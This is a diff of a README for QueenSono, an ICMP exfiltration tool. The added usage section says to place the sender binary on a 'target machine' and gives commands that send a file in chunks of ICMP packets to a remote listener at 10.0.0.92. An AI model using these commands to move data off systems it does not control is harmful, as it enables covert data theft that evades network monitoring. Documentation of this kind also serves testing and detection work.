@@ -17,23 +17,59 @@
 </p>
 
 ## Install
-> Install the binary from source
+ *\> Install the binary from source*
 Clone the repo and download the dependencies locally:
 ```    
-git clone https://github.com/ariary/AravisFS.git
+git clone https://github.com/ariary/QueenSono.git
 make before.build
 ```
 
- To build `adret` :
+ To build the ICMP packet sender `qssender` :
 
-     make build.adret
+     build.queensono-sender
     
- To build `adretctl` :
 
-     make build.adretclt
-	    
-Idem, to build `ubac`:
+ To build the ICMP packet receiver `qsreceiver` :
 
-    make build.ubac
+     build.queensono-receiver
+
+## Usage
+
+`qssender` is the binary which will send ICMP packet  to the listener , so it is the binary you have to transfer on your target machine. `qsreceiver` is the listener on your local machine (or wherever you can receive icmp packet)
+
+All commands and flags of the binaries could be found using `--help`
+
+### Example 1: Send with "ACK"
+*\> In this example we want to send a big file and look after echo reply to ackowledge the reception of the packets (ACK).*
+
+On my local machine:
+
+    $ qsreceiver receive -l 0.0.0.0 -p -f received_bible.txt
+ 
+
+ - `-l 0.0.0.0` listen on all interfaces for ICMP packet
+ - `-f received_bible.txt` save received data in a text
+ - `-p` show a progress bar of received data
+
+On target machine:
+
+    $ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt #download a huge file (for the example)
+    $ qssender send file -d 2 -l 127.0.0.1 -r 10.0.0.92 -s 50000 bible.txt
+
+<details>
+  <summary>Explanation</summary>
+  <ol>
+    <li>
+    <code>send file</code> for sending file (`bible.txt` is the file in question)
+    </li>
+    <li>
+      <code>-d 2</code> send a packet each 2 seconds
+    </li>
+    <li><code>-l 127.0.0.1</code> the listening address for *echo reply* </li>
+    <li><code>-r 10.0.0.92</code>` the address of my remote machine with `qsreceiver` listening</li>
+    <li><code>-s 50000</code> the data size I want to send in each packet</li>
+  </ol>
+</details>
+
 
 
